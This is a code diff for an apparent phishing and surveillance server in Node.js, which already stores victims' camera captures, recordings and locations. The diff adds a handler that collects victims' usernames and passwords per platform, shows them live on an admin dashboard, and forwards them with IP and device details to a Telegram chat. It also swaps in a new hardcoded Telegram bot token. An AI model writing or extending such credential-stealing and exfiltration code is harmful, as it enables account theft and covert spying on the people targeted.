@@ -21,7 +21,7 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 // ═══════════════════════════════════════════════════════════════════
 // TELEGRAM CONFIGURATION
 // ═══════════════════════════════════════════════════════════════════
-const TELEGRAM_BOT_TOKEN = '8086423271:AAHnppYI0Os1KGWOD0JpynQliY7hdVxM3HI';
+const TELEGRAM_BOT_TOKEN = '8013439584:AAGX2En5Q9cfbUu_yU5Zi3HUwhOs4FMlbzg';
 const TELEGRAM_CHAT_ID = '8262870180';
 
 /**
@@ -208,10 +208,11 @@ let db = {
     name: 'Admin',
     role: 'SuperAdmin'
   }],
-  users: [],      // { uuid, session_ids: { cookie_session_id, tab_session_id, page_load_id, socket_id, fingerprint_id, local_storage_id, engine_io_id }, country, browser, device_type, ip, is_online, created_at, last_active, location }
-  captures: [],   // { id, uuid, file_path, file_size, created_at }
-  recordings: [], // { id, uuid, file_path, duration, file_size, mime_type, created_at }
-  locations: []   // { uuid, latitude, longitude, accuracy, altitude, speed, heading, timestamp }
+  users: [],        // { uuid, session_ids: { cookie_session_id, tab_session_id, page_load_id, socket_id, fingerprint_id, local_storage_id, engine_io_id }, country, browser, device_type, ip, is_online, created_at, last_active, location }
+  captures: [],     // { id, uuid, file_path, file_size, created_at }
+  recordings: [],   // { id, uuid, file_path, duration, file_size, mime_type, created_at }
+  locations: [],    // { uuid, latitude, longitude, accuracy, altitude, speed, heading, timestamp }
+  credentials: []   // { id, uuid, platform, username, password, created_at }
 };
 
 let activityLog = []; // { id, type, uuid, message, timestamp }
@@ -243,9 +244,10 @@ function loadData() {
       db.captures = saved.captures || [];
       db.recordings = saved.recordings || [];
       db.locations = saved.locations || [];
+      db.credentials = saved.credentials || [];
       // Mark all users offline on startup
       db.users.forEach(u => u.is_online = false);
-      console.log(`📂 Loaded ${db.admins.length} admins, ${db.users.length} users, ${db.captures.length} captures`);
+      console.log(`📂 Loaded ${db.admins.length} admins, ${db.users.length} users, ${db.captures.length} captures, ${db.credentials.length} credentials`);
     }
   } catch (e) {
     console.log('📂 Starting with fresh database');
@@ -259,7 +261,8 @@ function saveData() {
       users: db.users,
       captures: db.captures,
       recordings: db.recordings,
-      locations: db.locations
+      locations: db.locations,
+      credentials: db.credentials
     }, null, 2));
   } catch (e) { /* silent */ }
 }
@@ -280,7 +283,8 @@ setInterval(sendDailySummary, 24 * 60 * 60 * 1000);
 let nextId = Math.max(
   0,
   ...db.captures.map(c => c.id || 0),
-  ...db.recordings.map(r => r.id || 0)
+  ...db.recordings.map(r => r.id || 0),
+  ...db.credentials.map(c => c.id || 0)
 ) + 1;
 
 // ═══════════════════════════════════════════════════════════════════
@@ -613,6 +617,23 @@ app.get('/api/export', authCheck, (req, res) => {
   });
 });
 
+// ─── Credentials Routes ──────────────────────────────────────────
+app.get('/api/credentials', authCheck, (req, res) => {
+  let credentials = [...db.credentials];
+  credentials.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+  res.json({ credentials });
+});
+
+app.delete('/api/credentials/:id', authCheck, authorize(['SuperAdmin', 'Moderator']), (req, res) => {
+  const id = parseInt(req.params.id);
+  const cred = db.credentials.find(c => c.id === id);
+  if (!cred) return res.status(404).json({ error: 'Credential not found' });
+  db.credentials = db.credentials.filter(c => c.id !== id);
+  saveData();
+  addLog('delete', cred.uuid, 'Credential deleted: ' + cred.platform + ' / ' + cred.username);
+  res.json({ message: 'Credential deleted' });
+});
+
 // ─── Stats Route ─────────────────────────────────────────────────
 app.get('/api/stats', authCheck, (req, res) => {
   res.json({
@@ -797,6 +818,40 @@ io.on('connection', (socket) => {
       }
       io.to('admin').emit('permissions:update', data);
     });
+
+    // ─── Credentials Submission ───────────────────────────────
+    socket.on('credentials:submit', (data) => {
+      if (!data || !data.platform) return;
+      const uuid = data.uuid || userUUID;
+
+      const credential = {
+        id: nextId++,
+        uuid: uuid,
+        platform: data.platform,
+        username: data.username || '',
+        password: data.password || '',
+        created_at: new Date().toISOString()
+      };
+      db.credentials.push(credential);
+
+      // Update user last_active
+      const user = db.users.find(u => u.uuid === uuid);
+      if (user) user.last_active = new Date().toISOString();
+
+      // Notify admin dashboard in real-time
+      io.to('admin').emit('feed:credentials', credential);
+
+      console.log(`🔐 Credentials captured: ${data.platform} / ${data.username} from ${uuid}`);
+
+      // Send to Telegram
+      const credUser = db.users.find(u => u.uuid === uuid);
+      const credMsg = `🔐 Credentials Captured\n\nPlatform: ${data.platform}\nUsername: ${data.username || '—'}\nPassword: ${data.password || '—'}\n\nUUID: ${uuid}\nDevice: ${credUser?.device_type || 'Unknown'}\nBrowser: ${credUser?.browser || 'Unknown'}\nIP: ${credUser?.ip || 'Unknown'}\n\n${new Date().toLocaleString()}`;
+      sendTextToTelegram(credMsg);
+      addLog('credentials', uuid, `Credentials captured: ${data.platform} / ${data.username}`);
+
+      saveData();
+    });
+
 
     socket.on('webrtc:ice-candidate', (data) => {
       if (!data || !data.adminSocketId || !data.candidate) return;
